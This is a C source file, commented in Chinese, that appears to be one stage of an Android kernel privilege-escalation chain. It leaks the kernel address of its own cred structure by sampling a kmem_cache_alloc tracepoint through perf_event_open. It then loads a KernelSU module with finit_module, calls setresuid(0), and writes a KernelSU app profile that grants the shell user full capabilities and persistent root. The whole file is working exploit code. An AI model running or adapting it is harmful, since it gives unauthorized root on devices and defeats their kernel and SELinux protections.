/*
 * cred_target.c —— 通过 perf 采样 kmem_cache_alloc 捕获本进程新 cred 地址。
 *
 * 背景：这台设备没有 cap tracepoint，且 kprobe_events 被 DAC 挡住（0640 root）。
 * 但 perf_event_open 可以直接按 tracepoint ID 采样，不需要 tracefs 写权限。
 *
 * 用法:
 *   cred_target <prepare_creds_addr> <kmem_cache_alloc_tp_id> [marker] [ko]
 *
 * 输出:
 *   CRED=0x...       当前进程（capset 后）的 cred
 *   FINTI rc=...     收到 marker 后 finit_module 的结果
 *   MODULE_LOADED
 *
 * BootForge v2 改动（模块装载段）：
 *   1. delete_module 带 EBUSY 重试（旧模块可能被残留的 ksu fd 占用）；
 *   2. 装载后做 GRANT_ROOT 自检；若被拒（例如 allow_shell 状态丢失），
 *      利用本进程已取得的能力 setresuid(0) 后经 supercall SET_APP_PROFILE
 *      把 shell(2000) 以 com.android.shell 键写回允许列表并持久化，
 *      然后再次自检。键对应已安装的系统包，避免包变更 prune 时被清掉。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define PERF_PAGES 16
#define CAP_VERSION_3 0x20080522

#define KSU_MAGIC_1 0xdeadbeefUL
#define KSU_MAGIC_2 0xcafebabeUL
#define KSU_IOCTL_GRANT_ROOT 0x4b01UL
#define KSU_IOCTL_SET_APP_PROFILE 0xc0004b08UL
#define KSU_PROFILE_SIZE 0x310

struct cap_hdr {
    uint32_t version;
    int pid;
};

struct cap_data {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

static int perf_open(struct perf_event_attr *attr, pid_t pid, int cpu)
{
    return (int)syscall(SYS_perf_event_open, attr, pid, cpu, -1, 0);
}

static int capset_zero(void)
{
    struct cap_hdr h = { .version = CAP_VERSION_3, .pid = 0 };
    struct cap_data d[2] = { {0, 0, 0}, {0, 0, 0} };
    return (int)syscall(SYS_capset, &h, d);
}

/* phase1 成功后 cap_bset 被清零，本进程的 CapBnd 会立刻变成 0。
 * 由 helper 自己写 CAPBND_OK，宿主无需再等一轮 adb 交互。 */
static int cap_bnd_zero(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    int ok = 0;
    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "CapBnd:", 7)) {
            ok = (strtoull(line + 7, NULL, 16) == 0);
            break;
        }
    }
    fclose(f);
    return ok;
}

static unsigned long long read_cap_eff(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    unsigned long long v = 0;
    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            v = strtoull(line + 7, NULL, 16);
            break;
        }
    }
    fclose(f);
    return v;
}

/* 落盘到 /data/local/tmp/magic/magic，重启后仍可判断模块加载是否真的执行过。 */
static void write_marker(const char *path, const char *fmt, ...)
{
    va_list ap;
    FILE *f = fopen(path, "w");
    if (!f)
        return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fclose(f);
}

/* 与 HOneClick perf_cred_honor.c 的 prepare_layout 一致：
 * 在 fsuid/fsgid 被清零后创建 KernelSU 用户态目录，并打印 LAYOUT_DONE。 */
static int prepare_layout(void)
{
    if (mkdir("/data/adb", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu/bin", 0755) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/modules", 0755) != 0 && errno != EEXIST)
        return -1;
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/su");
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/ksud");
    return 0;
}

static uint64_t scan_ring(struct perf_event_mmap_page *meta, size_t page,
                          uint64_t pc, uint32_t id, int *samples)
{
    size_t data_off = meta->data_offset ? meta->data_offset : page;
    size_t data_sz = meta->data_size ? meta->data_size : (size_t)PERF_PAGES * page;
    unsigned char *data = (unsigned char *)meta + data_off;
    uint64_t head = meta->data_head, tail = meta->data_tail;
    uint64_t found = 0;

    while (tail < head) {
        size_t off = (size_t)(tail % data_sz);
        struct perf_event_header h;
        memcpy(&h, data + off, sizeof h);
        if (h.size < sizeof h || off + h.size > data_sz)
            break;
        if (h.type == PERF_RECORD_SAMPLE) {
            const unsigned char *p = data + off + sizeof h;
            const unsigned char *end = data + off + h.size;
            if (p + 24 > end) { tail += h.size; continue; }
            p += 8;                 /* pid + tid */
            p += 8;                 /* time */
            uint32_t raw_size;
            memcpy(&raw_size, p, 4);
            p += 4;
            if (p + raw_size <= end && raw_size >= 24) {
                uint16_t common_type;
                memcpy(&common_type, p, 2);
                if (common_type == (uint16_t)id) {
                    uint64_t call_site, ptr;
                    memcpy(&call_site, p + 8, 8);
                    memcpy(&ptr, p + 16, 8);
                    if (call_site >= pc && call_site < pc + 0x800 &&
                        ptr >= 0xffffff8000000000ULL) {
                        found = ptr;
                        if (samples) (*samples)++;
                    }
                }
            }
        }
        tail += h.size;
    }
    meta->data_tail = tail;
    return found;
}

/* ===== BootForge v2 新增：GRANT_ROOT 自检与允许列表修复 ===== */

/* 子进程里做 GRANT_ROOT 自检：返回 0 表示当前 uid(2000) 已被模块放行。
 * 用子进程执行，避免 escape_to_root 改写本进程已被打补丁的 cred。 */
static int grant_selftest(void)
{
    pid_t pid = fork();
    if (pid < 0)
        return -1;
    if (pid == 0) {
        int fd = -1;
        syscall(SYS_reboot, KSU_MAGIC_1, KSU_MAGIC_2, 0, &fd);
        if (fd < 0)
            _exit(125);
        long rc = ioctl(fd, KSU_IOCTL_GRANT_ROOT, 0);
        int ok = (rc == 0 && geteuid() == 0);
        close(fd);
        _exit(ok ? 0 : 126);
    }
    int st = 0;
    while (waitpid(pid, &st, 0) < 0 && errno == EINTR) {}
    if (WIFEXITED(st))
        return WEXITSTATUS(st);
    return -1;
}

/* 以 root 身份经 supercall 把 shell(2000) 写回允许列表（模块会同时持久化）。
 * 结构布局按 ksu-template.ko 的 ksu_set_app_profile 实测偏移（version=4，
 * 总长 0x310）：key 用已安装的系统包 com.android.shell，避免包变更时
 * 被 ksu_prune_allowlist 清除（prune 仅无条件保留 1053 与 9999）。 */
static int ensure_shell_allowed(void)
{
    if (setresuid(0, 0, 0) != 0) {
        printf("SETUID0_FAIL errno=%d(%s)\n", errno, strerror(errno));
        return -1;
    }
    int fd = -1;
    syscall(SYS_reboot, KSU_MAGIC_1, KSU_MAGIC_2, 0, &fd);
    if (fd < 0) {
        printf("KSU_FD_FAIL\n");
        return -1;
    }
    unsigned char p[KSU_PROFILE_SIZE];
    memset(p, 0, sizeof p);
    *(uint32_t *)(p + 0x00) = 4;                    /* version（此构建校验 ==4） */
    strcpy((char *)(p + 0x04), "com.android.shell"); /* key */
    *(int32_t *)(p + 0x104) = 2000;                 /* current_uid */
    p[0x108] = 1;                                   /* allow_su */
    /* root_profile：uid@0x218 / gid@0x21c / groups_count@0x220 保持 0 */
    *(uint64_t *)(p + 0x2a8) = ~0ULL;               /* capabilities.effective */
    *(uint64_t *)(p + 0x2b0) = ~0ULL;               /* capabilities.permitted */
    *(uint64_t *)(p + 0x2b8) = ~0ULL;               /* capabilities.inheritable */
    strcpy((char *)(p + 0x2c0), "u:r:ksu:s0");      /* selinux_domain */
    long rc = ioctl(fd, KSU_IOCTL_SET_APP_PROFILE, p);
    int e = errno;
    printf("SET_APP_PROFILE rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
    close(fd);
    /* 回到 shell 身份再自检；setresuid 回非 0 会丢能力，但此后本进程只剩 pause。 */
    setresuid(2000, 2000, 2000);
    return rc == 0 ? 0 : -1;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <prepare_creds_addr> <tp_id> [marker] [ko]\n", argv[0]);
        return 2;
    }
    uint64_t pc = strtoull(argv[1], NULL, 0);
    uint32_t tp = (uint32_t)strtoul(argv[2], NULL, 0);
    const char *marker = argc > 3 ? argv[3] : NULL;
    const char *ko = argc > 4 ? argv[4] : NULL;

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof attr);
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof attr;
    attr.config = tp;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_TIME | PERF_SAMPLE_RAW;
    attr.wakeup_events = 1;
    attr.disabled = 1;
    attr.exclude_hv = 1;

    int fd = perf_open(&attr, 0, -1);
    if (fd < 0) {
        printf("ERR=perf_event_open:%d(%s)\n", errno, strerror(errno));
        return 1;
    }
    long page = sysconf(_SC_PAGESIZE);
    size_t map_sz = (size_t)(PERF_PAGES + 1) * (size_t)page;
    struct perf_event_mmap_page *meta =
        mmap(NULL, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (meta == MAP_FAILED) {
        printf("ERR=mmap:%d(%s)\n", errno, strerror(errno));
        return 1;
    }

    uint64_t cred = 0;
    int total_samples = 0;
    for (int i = 0; i < 64; i++) {
        int n = 0;
        ioctl(fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
        int rc = capset_zero();
        usleep(30000);
        ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
        __sync_synchronize();
        uint64_t c = scan_ring(meta, (size_t)page, pc, tp, &n);
        total_samples += n;
        if (!c)
            continue;
        cred = c;
        if (((c + 0x40) >> 16) & 1)
            break;                  /* CAP_SYS_MODULE 位可用 */
        if (rc != 0) {
            printf("WARN=capset:%d(%s)\n", errno, strerror(errno));
            break;
        }
    }
    munmap(meta, map_sz);
    close(fd);

    if (!cred) {
        printf("CRED=NONE samples=%d\n", total_samples);
        return 3;
    }
    printf("CRED=0x%llx samples=%d bit16=%d PID=%d\n", (unsigned long long)cred,
           total_samples, (int)(((cred + 0x40) >> 16) & 1), (int)getpid());
    fflush(stdout);

    if (!marker)
        return 0;

    /*
     * HOneClick 的顺序：拿到 cred 后先由 t64560_v36 把 fsuid/fsgid
     * (cred+0x20) 清零；本进程随后才能创建 /data/adb 并打印 LAYOUT_DONE，
     * 再等两阶段写完成并加载模块。
     */
    int layout_done = 0;
    int capbnd_written = 0;
    int capbnd_fails = 0;
    for (;;) {
        if (!capbnd_written && cap_bnd_zero()) {
            /* v3：目录兜底 + 777（本进程能力已清零，755 属主目录会 EACCES），
             * 失败持续重试但只打印前几次；run.sh 另有 CapBnd 轮询代写兜底。 */
            mkdir("/data/local/tmp/magic/honor", 0777);
            chmod("/data/local/tmp/magic/honor", 0777);
            int fd2 = open("/data/local/tmp/magic/honor/CAPBND_OK",
                          O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd2 >= 0) {
                close(fd2);
                capbnd_written = 1;
                printf("CAPBND_OK\n");
            } else if (++capbnd_fails <= 5) {
                printf("CAPBND_WRITE_FAIL errno=%d(%s)\n", errno, strerror(errno));
            }
            fflush(stdout);
        }
        if (!layout_done && prepare_layout() == 0) {
            layout_done = 1;
            printf("LAYOUT_DONE\n");
            fflush(stdout);
        }
        if (layout_done && access(marker, F_OK) == 0)
            break;
        usleep(100000);
    }

    if (ko) {
        unsigned long long ce = read_cap_eff();
        int has_module = (int)((ce >> 16) & 1);
        write_marker("/data/local/tmp/magic/magic/finti.try",
                     "CapEff=%#llx bit16=%d\n", ce, has_module);
        printf("FINTI_TRY ko=%s CapEff=%#llx bit16=%d\n", ko, ce, has_module);
        fflush(stdout);
        if (!has_module) {
            write_marker("/data/local/tmp/magic/magic/finti.skip",
                         "no CAP_SYS_MODULE CapEff=%#llx\n", ce);
            printf("FINTI_SKIP no CAP_SYS_MODULE\n");
            fflush(stdout);
        } else {
            /* 先卸载旧 kernelsu：上次加载的实例可能被残留的 ksu fd 占用，
             * EBUSY 时重试几轮；最终仍占用则保留旧模块，由后面的
             * ensure_shell_allowed 直接修复其允许列表。 */
            int dm_rc = -1, dm_errno = 0;
            for (int t = 0; t < 10; t++) {
                dm_rc = (int)syscall(SYS_delete_module, "kernelsu", O_NONBLOCK);
                dm_errno = errno;
                if (dm_rc == 0 || dm_errno != EBUSY)
                    break;
                usleep(500000);
            }
            if (dm_rc != 0 && dm_errno != ENOENT)
                printf("DELETE_MODULE rc=%d errno=%d(%s)\n", dm_rc, dm_errno, strerror(dm_errno));
            int kfd = open(ko, O_RDONLY);
            if (kfd < 0) {
                write_marker("/data/local/tmp/magic/magic/finti.rc",
                             "open rc=-1 errno=%d(%s)\n", errno, strerror(errno));
                printf("FINTI rc=-1 errno=%d(%s)\n", errno, strerror(errno));
            } else {
                errno = 0;
                long rc = syscall(SYS_finit_module, kfd,
                                  "allow_shell=1", 0);
                int e = errno;
                write_marker("/data/local/tmp/magic/magic/finti.rc",
                             "rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
                printf("FINTI rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
                close(kfd);
                if (rc == 0)
                    printf("MODULE_LOADED\n");
            }
            /* BootForge v2：无论模块是新装的还是沿用的，都自检并修复 shell 授权。 */
            int st = grant_selftest();
            if (st == 0) {
                printf("GRANT_ALREADY_OK\n");
            } else if (ensure_shell_allowed() == 0 && grant_selftest() == 0) {
                printf("GRANT_OK\n");
            } else {
                printf("GRANT_DENIED\n");
            }
            fflush(stdout);
        }
    }
    for (;;)
        pause();
}
